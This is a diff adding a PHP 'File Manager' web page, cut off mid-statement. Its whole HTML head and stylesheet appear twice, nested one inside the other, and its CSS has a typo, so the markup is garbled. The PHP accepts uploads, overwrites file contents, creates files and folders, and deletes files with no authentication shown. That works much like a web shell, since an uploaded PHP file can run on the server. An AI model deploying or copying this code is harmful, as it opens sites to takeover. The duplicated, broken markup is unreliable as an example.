@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>File Manager</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f8f9fa;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            width: 95%;
+            max-width: 1100px;
+            margin: 20px auto;
+            background-color: white;
+            padding: 15px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+        }
+        h1 {
+            text-align: center;
+            color: #333;
+            font-sizqe: 24px;
+        }
+        .file-list, .form-group {
+            margin-top: 15px;
+        }
+        .file-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 8px 12px;
+            border-bottom: 1px solid #ddd;
+        }
+        .file-item a {
+            color: #007bff;
+            text-decoration: none;
+        }
+        .file-item a:hover {
+            text-decoration: underline;
+        }
+        .actions a {
+            padding: 4px 8px;
+            font-size: 12px;
+            border-radius: 3px;
+            text-decoration: none;
+            color: white;
+            margin-left: 5px;
+        }
+        .edit-link { background-color: #17a2b8; }
+        .download-link { background-color: #28a745; }
+        .delete-link { background-color: #dc3545; }
+        .actions a:hover { opacity: 0.8; }
+        .btn {
+            display: inline-block;
+            padding: 6px 12px;
+            background-color: #007bff;
+            color: white;
+            text-decoration: none;
+            font-size: 14px;
+            border-radius: 5px;
+            text-align: center;
+        }
+        .btn:hover { background-color: #0056b3; }
+        .form-group {
+            display: flex;
+            gap: 8px;
+        }
+        .form-group input {
+            padding: 6px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            flex-grow: 1;
+            font-size: 14px;
+        }
+        .form-group input[type="submit"] {
+            background-color: #007bff;
+            color: white;
+            cursor: pointer;
+            border: none;
+            padding: 6px 12px;
+        }
+        .form-group input[type="submit"]:hover { background-color: #0056b3; }
+        .editor {
+            width: 100%;
+            height: 300px;
+            padding: 8px;
+            font-family: monospace;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            margin-top: 10px;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #555;
+        }
+        @media (max-width: 600px) {
+            .file-item { flex-direction: column; align-items: flex-start; }
+            .actions { margin-top: 5px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>File Manager</h1>
+
+        <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>File Manager</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f8f9fa;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            width: 95%;
+            max-width: 1100px;
+            margin: 20px auto;
+            background-color: white;
+            padding: 15px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+        }
+        h1 {
+            text-align: center;
+            color: #333;
+            font-sizqe: 24px;
+        }
+        .file-list, .form-group {
+            margin-top: 15px;
+        }
+        .file-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 8px 12px;
+            border-bottom: 1px solid #ddd;
+        }
+        .file-item a {
+            color: #007bff;
+            text-decoration: none;
+        }
+        .file-item a:hover {
+            text-decoration: underline;
+        }
+        .actions a {
+            padding: 4px 8px;
+            font-size: 12px;
+            border-radius: 3px;
+            text-decoration: none;
+            color: white;
+            margin-left: 5px;
+        }
+        .edit-link { background-color: #17a2b8; }
+        .download-link { background-color: #28a745; }
+        .delete-link { background-color: #dc3545; }
+        .actions a:hover { opacity: 0.8; }
+        .btn {
+            display: inline-block;
+            padding: 6px 12px;
+            background-color: #007bff;
+            color: white;
+            text-decoration: none;
+            font-size: 14px;
+            border-radius: 5px;
+            text-align: center;
+        }
+        .btn:hover { background-color: #0056b3; }
+        .form-group {
+            display: flex;
+            gap: 8px;
+        }
+        .form-group input {
+            padding: 6px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            flex-grow: 1;
+            font-size: 14px;
+        }
+        .form-group input[type="submit"] {
+            background-color: #007bff;
+            color: white;
+            cursor: pointer;
+            border: none;
+            padding: 6px 12px;
+        }
+        .form-group input[type="submit"]:hover { background-color: #0056b3; }
+        .editor {
+            width: 100%;
+            height: 300px;
+            padding: 8px;
+            font-family: monospace;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            margin-top: 10px;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #555;
+        }
+        @media (max-width: 600px) {
+            .file-item { flex-direction: column; align-items: flex-start; }
+            .actions { margin-top: 5px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>File Manager</h1>
+
+        <?php
+        $rootDir = __DIR__;
+        $currentDir = isset($_GET['dir']) ? realpath($_GET['dir']) : $rootDir;
+
+        if (!$currentDir || strpos($currentDir, $rootDir) !== 0) {
+            $currentDir = $rootDir;
+        }
+
+        if (!empty($_POST['new_folder_name'])) {
+            mkdir($currentDir . DIRECTORY_SEPARATOR . basename($_POST['new_folder_name']));
+        }
+
+        if (!empty($_POST['new_file_name'])) {
+            file_put_contents($currentDir . DIRECTORY_SEPARATOR . basename($_POST['new_file_name']), "");
+        }
+
+        if (!empty($_FILES['upload_file']['tmp_name'])) {
+            move_uploaded_file($_FILES['upload_file']['tmp_name'], $currentDir . DIRECTORY_SEPARATOR . basename($_FILES['upload_file']['name']));
+        }
+
+        if (!empty($_POST['file_content']) && isset($_GET['edit'])) {
+            file_put_contents($currentDir . DIRECTORY_SEPARATOR . basename($_GET['edit']), $_POST['file_content']);
+        }
+
+        if (isset($_GET['delete'])) {
+            $filePath = $currentDir . DIRECTORY_SEPARATOR . basename($_GET['delete']);
+            if (is_file($filePath)) {
+                unlink($filePath);
+            } elseif (is_dir($filePath) && count(scandir($filePath)) == 2) { // Folder empty hai tabhi delete ho
+                rmdir($filePath);
+            }
+        }
+
+        if (i
